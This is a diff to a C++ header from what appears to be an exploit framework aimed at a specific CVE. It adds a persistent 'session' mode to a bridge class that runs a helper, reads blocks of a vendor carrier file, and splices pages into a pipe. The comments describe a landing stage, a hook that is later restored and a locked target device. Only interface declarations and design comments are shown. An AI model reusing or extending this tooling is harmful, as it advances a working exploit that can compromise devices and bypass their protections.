@@ -21,19 +21,23 @@
  *  until it is told the patch went in. Nothing here decides that; the caller does, and the outcome
  *  says which call failed.
  *
- *  Lifetime: the two paths are copied in, nothing is opened, and every call forks a helper that exits
- *  on its own -- so a bridge can be constructed before the route is up and used only while it is.
+ *  Lifetime: the two paths are copied in and nothing is opened, so a bridge can be constructed before
+ *  the route is up and used only while it is. In the spawn form every call forks a helper that exits on
+ *  its own; in the session form the first call forks one that stays, and the bridge closes and reaps it
+ *  when it dies (or earlier, through close_session()).
  */
 #include <cstddef>
 #include <cstdint>
 
+#include "backend/cve_2026_43284/landing/bridge_session.hpp"
 #include "backend/cve_2026_43284/landing/real_splice_io.hpp"
 
 namespace ghostlock::backend::cve_2026_43284::landing {
-    /** How long a path this bridge will hold, including its terminator. */
-    inline constexpr std::size_t kBridgePathBytes = 256U;
-
-    /** The bridge. See the file note for what it stands in for. */
+    /** The bridge, in one of two forms: the spawn form this class has always had (one exec per block,
+     *  measured at ~38 ms per exec on the device) and the session form (one exec, then one IPC per
+     *  block, bridge_session.hpp). Both serve the same two sources, so the window above this sees no
+     *  difference. Which form runs is stated at bind() and defaults to spawn: the device that would
+     *  measure the session is locked, so the default does not move until it is. */
     class CrashDumpBridge final {
       public:
         /** How the last call ended. */
@@ -64,12 +68,28 @@ namespace ghostlock::backend::cve_2026_43284::landing {
          *                      different command.
          *  @param carrier_path The vendor file the helper reads.
          *  @param carrier_bytes Its length, under the same rule.
+         *  @param bridge_mode  kBridgeModeSpawn (the default, and today's behaviour: one exec per
+         *                      block) or kBridgeModeSession (one exec, asked over a channel). The
+         *                      session is handed the same two paths and starts on first use, so a
+         *                      bridge that is bound and never asked never forks.
          *  @return True when both paths were accepted. Nothing is executed here.
          */
         [[nodiscard]] bool bind(const char *helper_path, std::size_t helper_bytes,
-                                const char *carrier_path, std::size_t carrier_bytes) noexcept;
+                                const char *carrier_path, std::size_t carrier_bytes,
+                                int bridge_mode = kBridgeModeDefault) noexcept;
 
         [[nodiscard]] bool bound() const noexcept { return bound_; }
+        /** Which form this bridge was bound in: spawn (0) or session (1). */
+        [[nodiscard]] int bridge_mode() const noexcept { return mode_; }
+        /** Whether the session child is up; false in spawn mode, where there is no session. */
+        [[nodiscard]] bool session_open() const noexcept { return session_.is_open(); }
+        /** The session child's pid, or -1 when there is none. */
+        [[nodiscard]] pid_t session_pid() const noexcept { return session_.pid(); }
+        /** How many requests the session has carried, the handshake included. */
+        [[nodiscard]] std::size_t session_requests() const noexcept { return session_.requests(); }
+        /** Ends the session early (after the hook is restored, for instance). Idempotent, and a
+         *  session closed here stays closed: later blocks fail rather than start a second child. */
+        void close_session() noexcept;
 
         /** The preimage source: sixteen bytes of the carrier, read through the helper. */
         [[nodiscard]] OldPageSource old_page() noexcept {
@@ -94,9 +114,22 @@ namespace ghostlock::backend::cve_2026_43284::landing {
         /** The one exec both uses share. @p sink_stdout is where the block must come out. */
         [[nodiscard]] long run(std::uint64_t offset, int sink_stdout, std::uint8_t *out) noexcept;
 
+        /** Starts the session on first use. @return whether the session child is up. */
+        [[nodiscard]] bool session_ready() noexcept;
+        /** One block through the session. @return kBlockBytes, or -1 (the session latches dead). */
+        [[nodiscard]] long session_read16(std::uint64_t offset, std::uint8_t *out) noexcept;
+        /** One page spliced by the session into the caller's pipe. */
+        [[nodiscard]] long session_splice16(int pipe_write_fd, std::uint64_t offset) noexcept;
+
         char helper_[kBridgePathBytes] = {};
         char carrier_[kBridgePathBytes] = {};
         bool bound_ = false;
+        /** Spawn (0) or session (1); see bind(). */
+        int mode_ = kBridgeModeDefault;
+        /** The session form's child; inert (no fork, no fd) while the mode is spawn. */
+        BridgeSession session_;
+        bool session_attempted_ = false;
+        bool session_started_ = false;
         Outcome outcome_ = Outcome::Never;
         int last_status_ = 0;
     };
